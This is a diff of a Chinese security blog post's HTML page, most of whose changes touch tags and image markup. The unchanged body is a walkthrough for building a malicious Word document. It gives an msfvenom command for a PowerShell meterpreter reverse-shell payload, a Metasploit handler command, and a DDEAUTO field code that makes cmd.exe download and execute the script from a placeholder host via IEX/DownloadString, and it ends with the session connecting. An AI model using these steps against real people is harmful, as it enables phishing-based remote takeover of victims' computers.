@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="WEB安全|黑客技术|渗透测试|黑盒测试|网络安全|红蓝对抗|红队攻防" />
+  <meta name="keywords" content="Powershell,MSF," />
 
 
 
@@ -98,9 +98,10 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230133.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230314.png">
 <meta property="article:published_time" content="2020-04-30T15:26:54.000Z">
-<meta property="article:modified_time" content="2020-05-01T15:28:56.000Z">
+<meta property="article:modified_time" content="2021-04-18T05:22:23.947Z">
 <meta property="article:author" content="Assassins 小白">
-<meta property="article:tag" content="WEB安全|黑客技术|渗透测试|黑盒测试|网络安全|红蓝对抗|红队攻防|内网渗透">
+<meta property="article:tag" content="Powershell">
+<meta property="article:tag" content="MSF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234507.png">
 
@@ -348,41 +349,41 @@
       
         <p>这世上，没有谁活得比谁容易，只是有人在呼天抢地，有人在默默努力</p>
 <hr>
-<a id="more"></a>
+<span id="more"></span>
 
 <h5 id="Msfvenom生成Powershell木马"><a href="#Msfvenom生成Powershell木马" class="headerlink" title="Msfvenom生成Powershell木马"></a>Msfvenom生成Powershell木马</h5><blockquote>
 <p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.163.132 LPORT=1120 -f psh-reflection -o a.ps1</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234507.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234507.png"></p>
 <h5 id="Msf设置侦听"><a href="#Msf设置侦听" class="headerlink" title="Msf设置侦听"></a>Msf设置侦听</h5><blockquote>
 <p>handler -H 192.168.163.132 -P 1120 -p windows/x64/meterpreter/reverse_tcp</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234846.png" alt></p>
-<h5 id="这里使用2013版Word文档"><a href="#这里使用2013版Word文档" class="headerlink" title="这里使用2013版Word文档"></a>这里使用2013版Word文档</h5><p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501221647.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430234846.png"></p>
+<h5 id="这里使用2013版Word文档"><a href="#这里使用2013版Word文档" class="headerlink" title="这里使用2013版Word文档"></a>这里使用2013版Word文档</h5><p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501221647.png"></p>
 <ul>
 <li>一</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235117.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235117.png"></p>
 <ul>
 <li>二</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235433.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235433.png"></p>
 <ul>
 <li>三</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235519.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200430235519.png"></p>
 <h5 id="域代码"><a href="#域代码" class="headerlink" title="域代码"></a>域代码</h5><blockquote>
-<p>DDEAUTO C:\\windows\\system32\\cmd.exe “/k powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://xxx.xxx.xxx.xxx/a.ps1&#39;);&quot;" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/a.ps1&#39;);&quot;</a></p>
+<p>DDEAUTO C:\\windows\\system32\\cmd.exe “/k powershell IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/a.ps1&#39;);&quot;">http://xxx.xxx.xxx.xxx/a.ps1&#39;);&quot;</a></p>
 </blockquote>
 <p>插入域代码</p>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000435.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000435.png"></p>
 <p>打开，点击是</p>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000241.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000241.png"></p>
 <p>点击是</p>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000621.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501000621.png"></p>
 <p>确定</p>
-<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230133.png" alt></p>
-<h5 id="Msf上线"><a href="#Msf上线" class="headerlink" title="Msf上线"></a>Msf上线</h5><p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230314.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230133.png"></p>
+<h5 id="Msf上线"><a href="#Msf上线" class="headerlink" title="Msf上线"></a>Msf上线</h5><p><img src="https://raw.githubusercontent.com/Assassins-white/imgs/mastrt/img/20200501230314.png"></p>
 
       
     </div>
@@ -397,6 +398,14 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Powershell/" rel="tag"># Powershell</a>
+          
+            <a href="/tags/MSF/" rel="tag"># MSF</a>
+          
+        </div>
       
 
       
@@ -513,7 +522,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">61</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
